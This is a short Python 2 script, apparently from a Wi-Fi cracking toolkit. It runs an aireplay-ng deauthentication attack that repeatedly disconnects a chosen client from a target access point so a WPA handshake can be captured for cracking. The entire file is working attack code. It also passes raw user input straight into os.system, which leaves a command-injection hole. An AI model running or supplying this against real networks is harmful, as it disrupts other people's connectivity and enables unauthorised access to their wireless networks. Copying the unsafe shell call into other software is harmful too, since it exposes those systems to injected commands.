#!/usr/bin/env python
# coding=UTF-8

import os
import socket
import operator
# #from termcolor import colored
import sys
from CrackHead_Targeted import *
sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen

def main(capture_BSSID, capture_Channel, airodump_capture_file, capture_Interface):
    CLIENT_cmt = str(raw_input("Enter the CLIENT MAC address connected to AP: "))

    cmd_String = "aireplay-ng -0 0 -c %s -a %s --ignore-negative-one %s" % (
        CLIENT_cmt,
        capture_BSSID,
        capture_Interface
    )
    print cmd_String
    os.system(cmd_String)
    print 'Deauth attack run complete, check Airodump-ng for any packets containing the WPA handshake'
    return capture_BSSID, capture_Channel, airodump_capture_file, capture_Interface

main(capture_BSSID, capture_Channel, airodump_capture_file, capture_Interface)
